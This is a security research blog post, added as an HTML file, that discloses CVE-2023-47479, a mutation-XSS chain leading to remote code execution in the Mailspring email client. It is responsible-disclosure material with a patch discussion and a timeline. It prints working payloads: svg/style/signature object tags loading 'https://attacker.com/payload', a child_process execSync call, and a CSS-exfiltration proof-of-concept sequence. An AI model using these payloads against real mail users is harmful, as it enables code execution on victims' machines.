@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="Security research blog">
+    <meta property="og:type" content="website">
+    <meta name="description" content="Security research blog">
+    <meta name="keyword"  content="security,research,vulnerability,blog,vulnerabilites">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <title>
+        
+        Reply to calc: The Attack Chain to Compromise Mailspring - YNizry
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <style>
+    .googleicon {
+        vertical-align: middle;
+        font-size: 20px;
+        font-style: normal;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;    
+        color: #999999;
+        }
+    </style>
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+
+    
+  
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-SCK9223GY8"></script>
+    <script>
+      window.dataLayer = window.dataLayer || []
+      function gtag() {
+        dataLayer.push(arguments)
+      }
+      gtag('js', new Date())
+      gtag('config', 'G-SCK9223GY8')
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Yaniv Nizry Blogs" type="application/atom+xml">
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.webp" />
+        </div>
+        <div class="name">
+            <i>Yaniv Nizry</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="material-icons googleicon">home</i>
+                    <span>Blogs</span>
+                </a>
+            </li>
+            <li >
+                <a href="/advisories">
+                    <i class="material-icons googleicon">speaker_notes</i>
+                    <span>Advisories</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="material-icons googleicon">label</i>
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="material-icons googleicon">archive</i>
+                    <span>Archives</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="material-icons googleicon">person</i>
+                    <span>About</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="material-icons googleicon">search</i>
+                    <span>Search</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Impact"><span class="toc-text">Impact</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Technical-Details-CVE-2023-47479"><span class="toc-text">Technical Details - CVE-2023-47479</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mXSS-Background"><span class="toc-text">mXSS Background</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mXSS-in-the-Email-Renderer"><span class="toc-text">mXSS in the Email Renderer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypassing-the-mitigations"><span class="toc-text">Bypassing the mitigations</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Sandboxed-Iframe"><span class="toc-text">Sandboxed Iframe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Content-Security-Policy-Bypass"><span class="toc-text">Content Security Policy Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reply-to-forward-sanitization-bypass"><span class="toc-text">reply-to&#x2F;forward sanitization bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#From-XSS-to-RCE"><span class="toc-text">From XSS to RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Outdated-Electron-V8-Vulnerability"><span class="toc-text">Outdated Electron V8 Vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSS-Exfiltration"><span class="toc-text">CSS Exfiltration</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Patch"><span class="toc-text">Patch</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Timeline"><span class="toc-text">Timeline</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-text">Summary</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        <div class="post-container">
+    <div class="post-title">
+        Reply to calc: The Attack Chain to Compromise Mailspring    
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2024-03-10 23:00:00</span></span>
+        
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#rce" title="rce">rce</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#mxss" title="mxss">mxss</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#electron" title="electron">electron</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#csp" title="csp">csp</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#sop" title="sop">sop</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#sandbox" title="sandbox">sandbox</a>
+        <span>/</span>
+        
+        </span>
+        
+        
+
+        
+            <span class="attr">/
+            
+                <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2023-47479" title="CVE-2023-47479">CVE-2023-47479</a>
+                    <span>/</span>
+            
+            
+            </span>
+        
+
+
+        
+        <!--<span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>-->
+    </span>
+    </span>
+    </div>
+
+    <div class="post-source-meta post-meta">
+        
+            <a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/reply-to-calc-the-attack-chain-to-compromise-mailspring/">Source</a>
+        
+    </div>
+    <div class="post-content no-indent">
+        <h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Mailspring, formerly known as <a target="_blank" rel="noopener" href="https://github.com/nylas/nylas-mail">nylas-mail</a>, is a popular email client application that gives users a fast and efficient way to manage their email accounts. It is a free and open-source program for Windows, Mac, and Linux operating systems. Mailspring comes with a variety of advanced features, such as snoozing emails, scheduling messages, email tracking, and more. It also supports a wide range of email services, including Gmail, Yahoo, Outlook, and more. With its user-friendly interface and powerful functionality, Mailspring has become a popular choice for those looking for a reliable and versatile email client.</p>
+<p>Continuing our effort to improve open-source security and enhance our Clean Code technology, we decided to research and evaluate the security of the Mailspring desktop application. Considering its popularity, security issues in the application have a high impact potential. In this blog, we will present our research and findings. </p>
+<h1 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h1><p>Mailspring versions before 1.11.0 are susceptible to several vulnerabilities, enabling an attacker to execute arbitrary code when a victim tries to reply to or forward a malicious email.</p>
+<iframe width="736" height="414" src="https://www.youtube.com/embed/rbeHR2Tq3dM" title="Reply to Calc: the Attack Chain to Compromise Mailspring" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+<p>Mailspring version 1.11.0 employs mitigations to prevent exploitation. However, the underlying vulnerability has not been fixed as of today.</p>
+<h1 id="Technical-Details-CVE-2023-47479"><a href="#Technical-Details-CVE-2023-47479" class="headerlink" title="Technical Details - CVE-2023-47479"></a>Technical Details - CVE-2023-47479</h1><p>In the following section, we will explain the technical details of the vulnerabilities, which are tracked as CVE-2023-47479. We will describe how an attacker can bypass some mitigations to ultimately achieve code execution when a user replies to or forwards a malicious email. </p>
+<h2 id="mXSS-Background"><a href="#mXSS-Background" class="headerlink" title="mXSS Background"></a>mXSS Background</h2><p>Mutation Cross-Site Scripting (mXSS) is a sophisticated variation of the well-known Cross-Site Scripting (XSS) vulnerability. When an application needs to safely render the user’s input as HTML, to support some HTML features, sanitization would be the solution. Allowing specific tags and attributes while stripping or encoding others. Unfortunately, this is not a straightforward task since HTML is a syntax-tolerant language that may change or “mutate” when parsing. mXSS takes advantage of that by providing a payload that seems innocent initially when parsing (during the sanitization process) but mutates it to a malicious one when re-parsing it (in the final stage of displaying the content).</p>
+<h2 id="mXSS-in-the-Email-Renderer"><a href="#mXSS-in-the-Email-Renderer" class="headerlink" title="mXSS in the Email Renderer"></a>mXSS in the Email Renderer</h2><p>Before rendering and showing an email to the user, Mailspring sanitizes the content with a <a target="_blank" rel="noopener" href="https://github.com/Foundry376/Mailspring/blob/a3aecf628a77d51badaa7a8860acffab0f1afcb3/app/src/services/sanitize-transformer.ts#L527">built-in sanitizer</a>. The sanitizer uses <code>DOMParser</code> and, according to a predefined list, will accept, remove, or replace tags and content. Problems occur when the sanitizer changes a disallowed tag after the parsing is done, causing the resulting content to be parsed differently.</p>
+<p>For example, we will use the following email content:<br><img src="/img/blogs/mailspring/image11.png" style="width: 100%;"/></p>
+<p>Parsing the given string to a DOM tree will result in an <code>a</code> tag inside the <code>style</code> as expected within “<a target="_blank" rel="noopener" href="https://html.spec.whatwg.org/#parsing-main-inforeign">foreign content</a>”, this is because <code>style</code> is handled differently in <a target="_blank" rel="noopener" href="https://infra.spec.whatwg.org/#svg-namespace">SVG</a>&#x2F;<a target="_blank" rel="noopener" href="https://infra.spec.whatwg.org/#mathml-namespace">MathML</a> namespaces:</p>
+<img src="/img/blogs/mailspring/image9.png" style="width: 100%;"/>
+
+<p>Mailspring doesn’t allow <code>svg</code> tags and will <a target="_blank" rel="noopener" href="https://github.com/Foundry376/Mailspring/blob/a3aecf628a77d51badaa7a8860acffab0f1afcb3/app/src/services/sanitize-transformer.ts#L478">replace</a> them with <code>span</code> tags during the sanitization. We covered the risk of “Desanitization” (the act of changing and interfering with the sanitizer’s output) in previous blogs where we encountered other vulnerabilities that follow this dangerous behavior: </p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/pitfalls-of-desanitization-leaking-customer-data-from-osticket/">Pitfalls of Desanitization: Leaking Customer Data from osTicket</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/">Code Vulnerabilities Put Proton Mails at Risk</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/code-vulnerabilities-put-skiff-emails-at-risk/">Code Vulnerabilities Put Skiff Emails at Risk</a></li>
+<li>And more</li>
+</ul>
+<p>Because Mailspring continues iterating over the manipulated sanitizer’s output using the same parsed DOM tree, it would still seem as if there were a foreign content tag (<code>svg</code> and not <code>span</code>):</p>
+<img src="/img/blogs/mailspring/image10.png" style="width: 100%;"/>
+
+<p>This is why the sanitizer can’t see the malicious tag, but later, when embedding the result in the page, the <code>style</code> tag won’t be inside a “<a target="_blank" rel="noopener" href="https://html.spec.whatwg.org/#parsing-main-inforeign">foreign content</a>” and thus closes where the <code>title</code> attribute used to be:</p>
+<img src="/img/blogs/mailspring/image5.png" style="width: 100%;"/>
+
+<p>We can see our injected tag in the rendered content. But it is inside a sandboxed iframe, stopping it from executing any JavaScript code.</p>
+<img src="/img/blogs/mailspring/image15.png" style="width: 100%;"/>
+
+<h2 id="Bypassing-the-mitigations"><a href="#Bypassing-the-mitigations" class="headerlink" title="Bypassing the mitigations"></a>Bypassing the mitigations</h2><h3 id="Sandboxed-Iframe"><a href="#Sandboxed-Iframe" class="headerlink" title="Sandboxed Iframe"></a>Sandboxed Iframe</h3><p>There is not much an attacker can do inside a sandboxed iframe, but we noticed that when a user replies to or forwards an email, the content of it will be rendered again outside of the sandboxed iframe.</p>
+<img src="/img/blogs/mailspring/image14.png" style="width: 50%;"/>
+
+<p>However, the injected JavaScript code will still not run because of a Content Security Policy in the main window:</p>
+<img src="/img/blogs/mailspring/image12.png" style="width: 100%;"/>
+<img src="/img/blogs/mailspring/image13.png" style="width: 100%;"/>
+
+<h3 id="Content-Security-Policy-Bypass"><a href="#Content-Security-Policy-Bypass" class="headerlink" title="Content Security Policy Bypass"></a>Content Security Policy Bypass</h3><p>When evaluating this policy, we noticed that there is a misconfiguration:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src * mailspring:; script-src &#x27;self&#x27; chrome-extension://react-developer-tools; style-src * &#x27;unsafe-inline&#x27; mailspring:; img-src * data: mailspring: file:;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Because <code>default-src</code> is set to <code>*</code> and there’s no <code>object-src</code> override, an attacker can execute code with an <code>object</code> tag. This is limited to JavaScript files served via the <code>http</code>, <code>https</code>, <code>ws</code>, and <code>wss</code> protocols by default.</p>
+<p>In addition to that, <code>script-src &#39;self&#39;</code> allows using a <code>script</code> tag with a local file as a <code>src</code> to execute JavaScript code. This works because Electron, the underlying technology behind Mailspring,  serves the UI via the <code>file://</code> protocol. To abuse this, an attacker must control a file on the victim’s computer and point to it via a script’s <code>src</code> attribute.</p>
+<p>However, when sending a new payload that uses a malicious <code>object</code> tag to bypass the CSP, replying to&#x2F;forwarding it, would mysteriously remove our tag. This did not happen for the initial payload with the <code>img</code> tag, so what is going on here?</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;a title=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&#x27;https://attacker.com/payload&#x27;</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Email body:</p>
+<img src="/img/blogs/mailspring/image2.png" style="width: 100%;"/>
+
+<p>Reply-to&#x2F;forward content:</p>
+<img src="/img/blogs/mailspring/image4.png" style="width: 100%;"/>
+
+<p>There must be another sanitization when replying to or forwarding an email.</p>
+<img src="/img/blogs/mailspring/image1.png" style="width: 100%;"/>
+
+<h3 id="reply-to-forward-sanitization-bypass"><a href="#reply-to-forward-sanitization-bypass" class="headerlink" title="reply-to&#x2F;forward sanitization bypass"></a>reply-to&#x2F;forward sanitization bypass</h3><p>Drilling down to the component that handles the reply&#x2F;forward window, we came across <a target="_blank" rel="noopener" href="https://github.com/Foundry376/Mailspring/blob/1.10.8/app/src/decorators/inflates-draft-client-id.tsx#L77">inflates-draft-client-id.jsx</a>. The <code>draft</code> content still contains our <code>object</code> tag at this point but will later be removed, so this content is before the 2nd sanitization. </p>
+<img src="/img/blogs/mailspring/image8.png" style="width: 100%;"/>
+
+<p>Looking at this HTML draft snippet, we understand that Mailspring adds content to the window, such as the user’s mail signature, custom CSS, timestamp, etc. The <code>signature</code> tag at the start of the draft caught our attention. Since it’s a custom tag and appended before the replied&#x2F;forwarded malicious email content, maybe the sanitization there is different? </p>
+<p>Indeed, embedding the malicious input in a <code>signature</code> tag avoided the 2nd sanitization. As a result, this payload allows the execution of arbitrary JavaScript code:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;a title=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">signature</span>&gt;</span><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&#x27;https://attacker.com/payload&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">signature</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/img/blogs/mailspring/image7.png" style="width: 100%;"/>
+
+<h2 id="From-XSS-to-RCE"><a href="#From-XSS-to-RCE" class="headerlink" title="From XSS to RCE"></a>From XSS to RCE</h2><p>The <a target="_blank" rel="noopener" href="https://github.com/Foundry376/Mailspring/blob/3be72eee5c10a43f6fb9924ab1e9a33bb0f5216e/app/src/browser/mailspring-window.ts#L100">main</a> window of Mailspring uses <code>nodeIntegration: true</code> and <code>contextIsolation: false</code>, meaning any JavaScript code that runs in this context can also access the internal NodeJS objects and thus execute arbitrary code on the machine. Because the payload until this point has been executed in the origin of <code>attacker.com</code>, which blocks the attacker from accessing the main parent window due to the <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">same-origin policy</a>, an attacker would need to find a way to escalate the impact from XSS to RCE. </p>
+<p>From here, we came up with two different vectors:</p>
+<h3 id="Outdated-Electron-V8-Vulnerability"><a href="#Outdated-Electron-V8-Vulnerability" class="headerlink" title="Outdated Electron V8 Vulnerability"></a>Outdated Electron V8 Vulnerability</h3><p>Mailspring runs on an outdated electron, thus a chromium version that is susceptible to <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2022-1364">CVE-2022-1364</a>, and potentially other 1days (running <code>window.navigator.userAgent</code> on the dev tools gives the following value):</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Mozilla</span>/<span class="number">5</span>.<span class="number">0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_15_7) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Mailspring/<span class="number">1</span>.<span class="number">10</span>.<span class="number">8</span> Chrome/<span class="number">98</span>.<span class="number">0</span>.<span class="number">4758</span>.<span class="number">141</span> Electron/<span class="number">17</span>.<span class="number">4</span>.<span class="number">0</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br></pre></td></tr></table></figure>
+
+<p>An attacker can use known exploits to gain full command execution regardless of Electron’s origin isolation.</p>
+<h3 id="CSS-Exfiltration"><a href="#CSS-Exfiltration" class="headerlink" title="CSS Exfiltration"></a>CSS Exfiltration</h3><p>The XSS shown above is executed from an external website origin, stopping the JavaScript from accessing the <code>top</code> window due to the <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same-origin-policy</a>. For a window to be able to access its parent, both should be same-origin. Since Mailspring runs on the <code>file://</code> scheme, any framed window (<code>object</code>, <code>iframe</code>, <code>embed</code>, etc.) that is also from the <code>file://</code> scheme can access the main window (and then node internals).</p>
+<p>For that, an attacker needs to have control over a file on the machine; this can be achieved with attachment files. After sending an email with an attachment, we saw that the files are moved to a randomly <a target="_blank" rel="noopener" href="https://github.com/Foundry376/Mailspring/blob/3be72eee5c10a43f6fb9924ab1e9a33bb0f5216e/app/src/flux/stores/attachment-store.ts#L67">generated directory</a> under <code>…/Mailspring/files/&lt;random-id&gt;.substr(0, 2)/&lt;random&gt;.substr(2, 2)/&lt;random-id&gt;/attachment_file</code>. This path is not reflected in the DOM and cannot be guessed.</p>
+<p>But sending an <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/6706891/embedding-image-in-html-email">inline image</a> (with CID) will cause the path to be reflected in the DOM. Using that, an attacker can use known <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection">CSS exfiltration techniques</a>, given that CSS is allowed by Mailspring’s sanitizer, to extract the random path of the controlled file. Then use the same XSS as before but point the <code>object</code>’s <code>data</code> tag to the controlled file. Since it’s the same origin as the main window, accessing <code>parent</code> and running arbitrary node commands is possible.<br><img src="/img/blogs/mailspring/image3.png" style="width: 100%;"/></p>
+<p>The POC:</p>
+<ol>
+<li>Attacker sets up a CSS exfiltration server.</li>
+<li>Attacker sends an email with the CSS exfiltration payload and an inline “image” which is actually the following malicious HTML page: <code>&lt;script&gt;top.require(&#39;child_process&#39;).execSync(&#39;open -a Calculator&#39;)&lt;/script&gt;</code></li>
+<li>When the victim views the email, the payload “image” path is extracted.</li>
+<li>Attacker sends a second email with the mXSS payload pointing to the extracted path: <code>&lt;svg&gt;&lt;style&gt;&lt;a title=&quot;&lt;/style&gt;&lt;signature&gt;&lt;object data=&#39;**extracte_path**&#39;&gt;&lt;/object&gt;&lt;/signature&gt;&quot;&gt;&lt;/style&gt;</code></li>
+<li>When a victim tries to reply or forward the message, a calculator will show up.</li>
+</ol>
+<img src="/img/blogs/mailspring/image6.png" style="width: 100%;"/>
+
+<h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><p>We tried contacting the maintainers in various ways, but due to unresponsiveness, the only implemented <a target="_blank" rel="noopener" href="https://github.com/Foundry376/Mailspring/commit/5126294f589d94231ea8ec31a94847ccdf6f4dcb">fix</a> was hardening the CSP.</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+ object-src none; media-src mailspring:; manifest-src none;</span></span><br></pre></td></tr></table></figure>
+
+<p>Despite the lack of proper attention and fix, there are several takeaways developers can take from these findings:</p>
+<ul>
+<li>Avoid interfering with data after the sanitization (<a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/pitfalls-of-desanitization-leaking-customer-data-from-osticket/">Desanitization</a>).</li>
+<li>Follow the <a target="_blank" rel="noopener" href="https://www.electronjs.org/docs/latest/tutorial/security">official Electron Security documentation</a> which covers <a target="_blank" rel="noopener" href="https://www.electronjs.org/docs/latest/tutorial/security#2-do-not-enable-nodejs-integration-for-remote-content">node integration</a>, <a target="_blank" rel="noopener" href="https://www.electronjs.org/docs/latest/tutorial/security#3-enable-context-isolation">context isolation</a>, <a target="_blank" rel="noopener" href="https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols">file protocol</a>, and more.</li>
+<li>Ensure your mitigation steps, such as <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP</a>, are configured correctly.</li>
+</ul>
+<h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><table>
+<thead>
+<tr>
+<th>Date</th>
+<th>Action</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2023-04-27</td>
+<td>We report all issues to the vendor, including our disclosure policy</td>
+</tr>
+<tr>
+<td>2023-05-11</td>
+<td>We Ping the vendor</td>
+</tr>
+<tr>
+<td>2023-05-23</td>
+<td>We Ping the vendor using a personal email address</td>
+</tr>
+<tr>
+<td>2023-06-26</td>
+<td>We open a discrete issue on GitHub</td>
+</tr>
+<tr>
+<td>2023-07-04</td>
+<td>The vendor acknowledges the report</td>
+</tr>
+<tr>
+<td>2023-07-29</td>
+<td>The CSP policy is hardened</td>
+</tr>
+<tr>
+<td>2023-08-09</td>
+<td>We ping the vendor, offering help with the fixes</td>
+</tr>
+<tr>
+<td>2023-09-05</td>
+<td>We ping the vendor again with no success</td>
+</tr>
+<tr>
+<td>2024-03-09</td>
+<td>We notify the vendor about the release of this blog</td>
+</tr>
+</tbody></table>
+<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>In this blog, we covered a vulnerability chain that attackers might exploit to achieve RCE on a victim’s computer simply by manipulating them to click “reply-to” or “forward” from a malicious email. We explained the importance of avoiding the dangerous <a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/pitfalls-of-desanitization-leaking-customer-data-from-osticket/">Desanitization</a> pattern and outlined the significance of a strong CSP.</p>
+<p>To help you implement these critical aspects in your own code, Sonar provides a vast range of security rules, such as <a target="_blank" rel="noopener" href="https://sonarsource.github.io/rspec/#/rspec/S5728">S5728</a>, which ensures that a default-src CSP directive is set. This reduces the impact of XSS vulnerabilities and follows the Clean Code principle, which emphasizes the creation of clear and maintainable software. This not only facilitates the detection and resolution of vulnerabilities throughout the development process but also reduces the risk of introducing security weaknesses that malicious actors could exploit.</p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        <li>
+            <a target="_blank" href="https://twitter.com/YNizry">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-twitter"></i>
+                            </span>
+            </a>
+        </li>
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/yaniv-git">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://www.linkedin.com/in/yaniv-n-8b4a76193">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-linkedin"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+    </ul>
+    
+    <p>
+    Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
